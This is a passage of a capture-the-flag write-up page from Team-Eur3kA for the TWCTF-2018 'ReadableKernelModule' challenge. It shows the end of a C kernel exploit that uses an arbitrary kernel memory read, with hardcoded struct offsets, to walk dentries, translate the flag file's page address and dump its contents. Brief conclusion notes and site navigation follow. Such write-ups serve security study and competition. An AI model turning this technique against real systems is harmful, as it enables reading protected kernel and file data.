+    printf(&quot;root subdirs @ 0x%lx\n&quot;, root_subdirs);
+
+    unsigned long subdir = root_subdirs - 0x90;
+
+    char flag_name_test_buf[10];
+    unsigned long flag_dentry = 0;
+
+    /* try prevs first, I found it more likely to be in prevs */
+    while (1) {
+      memset(flag_name_test_buf, 0, 10);
+      unsigned int entry_name_size = 0;
+      ret = read_kernel_memory(fd, id, subdir + 0x24, &amp;entry_name_size, 4);
+      CHECKED(ret, &quot;read entry name size&quot;);
+      printf(&quot;entry name size %d\n&quot;, entry_name_size);
+
+      unsigned long entry_name_address = 0;
+      ret = read_kernel_memory(fd, id, subdir + 0x24 + 4, &amp;entry_name_address, 8);
+      CHECKED(ret, &quot;read entry name address&quot;);
+      printf(&quot;entry name address @ 0x%lx\n&quot;, entry_name_address);
+
+      ret = read_kernel_memory(fd, id, entry_name_address, flag_name_test_buf, entry_name_size);
+      CHECKED(ret, &quot;read entry name&quot;);
+
+      printf(&quot;Found entry %s\n&quot;, flag_name_test_buf);
+
+      if (!strcmp(flag_name_test_buf, &quot;flag&quot;)) {
+        /* found it */
+        printf(&quot;Found flag dentry at 0x%lx\n&quot;, subdir);
+        flag_dentry = subdir;
+        break;
+      }
+
+      unsigned long prev = 0;
+      ret = read_kernel_memory(fd, id, subdir + 0x90, &amp;prev, 8);
+      CHECKED(ret, &quot;read prev&quot;);
+      printf(&quot;prev @ 0x%lx\n&quot;, prev);
+      /* not found */
+
+      if (!prev) {
+        /* no other prevs */
+        break;
+      }
+
+      subdir = prev - 0x90;
+      printf(&quot;prev subdir @ 0x%lx\n&quot;, subdir);
+    }
+
+    unsigned long flag_inode = 0;
+    ret = read_kernel_memory(fd, id, flag_dentry + 0x30, &amp;flag_inode, 8);
+    CHECKED(ret, &quot;read flag inode&quot;);
+    printf(&quot;flag inode @ 0x%lx\n&quot;, flag_inode);
+    
+    unsigned long flag_imapping = 0;
+    ret = read_kernel_memory(fd, id, flag_inode + 48, &amp;flag_imapping, 8);
+    CHECKED(ret, &quot;read flag i_mapping&quot;);
+    printf(&quot;flag i_mapping @ 0x%lx\n&quot;, flag_imapping);
+
+    unsigned long node_addr = 0;
+    ret = read_kernel_memory(fd, id, flag_imapping + 16, &amp;node_addr, 8);
+    CHECKED(ret, &quot;read node address&quot;);
+    printf(&quot;flag page address @ 0x%lx\n&quot;, node_addr);
+
+    /* copy_page_to_iter @ 0xffffffff81203ba0(in ida, with base 0xffffffff81000000) */
+    /* There is logic to get virtual address. copy it! */
+    unsigned long page_offset_base_addr = (0xFFFFFFFF81C256B8 - 0xffffffff81000000) + kernel_addr;
+    unsigned long vmemmap_base_addr = page_offset_base_addr - 0x10;
+
+    unsigned long page_offset_base = 0;
+    unsigned long vmemmap_base = 0;
+
+    ret = read_kernel_memory(fd, id, page_offset_base_addr, &amp;page_offset_base, 8);
+    CHECKED(ret, &quot;read page offset base&quot;);
+    printf(&quot;page offset base 0x%lx\n&quot;, page_offset_base);
+
+    ret = read_kernel_memory(fd, id, vmemmap_base_addr, &amp;vmemmap_base, 8);
+    CHECKED(ret, &quot;read vmemmap base&quot;);
+    printf(&quot;vmemmap base 0x%lx\n&quot;, vmemmap_base);
+
+    /* calculate virtual address */
+    unsigned long flag_addr = node_addr;
+    flag_addr -= vmemmap_base;
+    flag_addr &gt;&gt;= 6;
+    flag_addr &lt;&lt;= 0xc;
+    flag_addr += page_offset_base;
+    printf(&quot;flag @ 0x%lx\n&quot;, flag_addr);
+
+    char *flag_buf = (char*) malloc(0x100);
+    ret = read_kernel_memory(fd, id, flag_addr, flag_buf, 0x100);
+    CHECKED(ret, &quot;read flag&quot;);
+    printf(&quot;flag: %s\n&quot;, flag_buf);
+    free(flag_buf);
+
+    return 0;
+}
+</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<ol>
+<li>Parse fs should be fun.</li>
+<li>Unless structs are randomized..</li>
+<li>Randomized structs are still defeatable, if you are a dedicated attacker.</li>
+</ol>
+
+<p>I&rsquo;m also considering automate this process, since I do think static analysis of code snippets with the help of source code of the kernel can get me out most of the offset&hellip;</p>
+
+<p>Special thanks to @monster who gave me the original thought of how to solve this challenge, and @Garyo who gave this interesting challenge and helped me solving this.</p>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://Team-Eur3kA.github.io/tags/twctf/">TWCTF</a>
+
+  <a class="tag tag--primary tag--small" href="https://Team-Eur3kA.github.io/tags/twctf-2018/">TWCTF-2018</a>
+
+  <a class="tag tag--primary tag--small" href="https://Team-Eur3kA.github.io/tags/writeup/">writeup</a>
+
+                  </div>
+                
+              
+            
+            
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Team-Eur3kA.github.io/2018/03/n1ctf-2018-network-card-writeup/" data-tooltip="N1CTF 2018 Network Card Writeup">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+            
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2018 Team-Eur3kA. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Team-Eur3kA.github.io/2018/03/n1ctf-2018-network-card-writeup/" data-tooltip="N1CTF 2018 Network Card Writeup">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://farscapedevelopment.files.wordpress.com/2012/07/eureka.gif" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Team-Eur3kA</h4>
+    
+      <div id="about-card-bio">CTF Security Team Eur3kA deriving from former united team FFF-PKyou which consists of members from multiple united team FFF and Peking University team PKyou</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Security Team
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        China
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="Search" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center">no post found</div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://Team-Eur3kA.github.io/2018/09/twctf-2018-rkm-readablekernelmodule-writeup/">
+                <h3 class="media-heading">TWCTF-2018 RKM (ReadableKernelModule) writeup</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://Team-Eur3kA.github.io/2018/03/n1ctf-2018-network-card-writeup/">
+                <h3 class="media-heading">N1CTF 2018 Network Card Writeup</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Mar 3, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Hi, I&rsquo;m Ne0. Last weekend we Eur3kA played Nu1L CTF 2018 and won the champion. Thanks all my strong teammates. This kernel pwn challenge is not very difficult but kind of tricky. Thanks @Anciety&rsquo;s help.
+Challenge info The challenge files includes the following:
+➜ network_card ls bzImage initramfs.img nu1l.ko startvm.sh  Obviously we should focus on nu1l.ko. Take a look at the startvm.sh and we will find that we have to bypass kaslr,smep and smap to solve this challenge.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://Team-Eur3kA.github.io/2018/03/n1ctf-2018-memsafety-writeup/">
+                <h3 class="media-heading">N1CTF-2018 memsafety Writeup</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Mar 3, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://Team-Eur3kA.github.io/2018/02/codegate-2018-7amebox1-writeup/">
+                <h3 class="media-heading">CodeGate 2018 7amebox1 Writeup</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Feb 2, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://Team-Eur3kA.github.io/2018/02/codegate-2018-web-writeup/">
+                <h3 class="media-heading">CodeGate 2018 Web Writeup</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Feb 2, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://Team-Eur3kA.github.io/2018/02/welcome-to-team-eur3ka-site/">
+                <h3 class="media-heading">Welcome to Team Eur3kA site</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Feb 2, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Welcome a lot to visit Team Eur3kA offitial site.
+</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero="no post found"
+         data-message-one="1 post found"
+         data-message-other="{n} posts found">
+         6 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('https://Team-Eur3kA.github.io/images/cover.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://Team-Eur3kA.github.io/js/script-qi9wbxp2ya2j6p7wx1i6tgavftewndznf4v0hy2gvivk1rxgc3lm7njqb6bz.min.js"></script>
+
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+  
+
+
+
+    
+  </body>
+</html>
+
